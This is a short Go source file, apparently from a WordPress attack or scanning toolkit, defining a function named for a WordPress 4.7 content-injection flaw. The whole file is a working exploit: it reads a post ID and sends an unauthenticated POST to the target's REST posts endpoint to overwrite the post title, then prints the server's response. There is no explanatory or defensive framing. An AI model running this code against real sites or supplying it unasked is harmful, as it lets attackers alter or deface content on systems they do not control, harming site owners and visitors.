package wordpress

import (
	"fmt"
	"net/http"
	"bytes"
	"io/ioutil"
	"bufio"
	"os"
	"strings"
)

func ContentInjection_4_7(target string) {


	reader := bufio.NewReader(os.Stdin)
	fmt.Print("POST ID: ")
	postId, _ := reader.ReadString('\n')
	postId = strings.TrimSuffix(postId, "\n")

	url := target + "/wp-json/wp/v2/posts/"+postId

    var jsonStr = []byte(`{"id":"`+postId+`","title":"postidVulnerable"}`)
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
    req.Header.Set("Content-Type", "application/json")

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    fmt.Println("response Status:", resp.Status)
    fmt.Println("response Headers:", resp.Header)
    body, _ := ioutil.ReadAll(resp.Body)
    fmt.Println("response Body:", string(body))

}
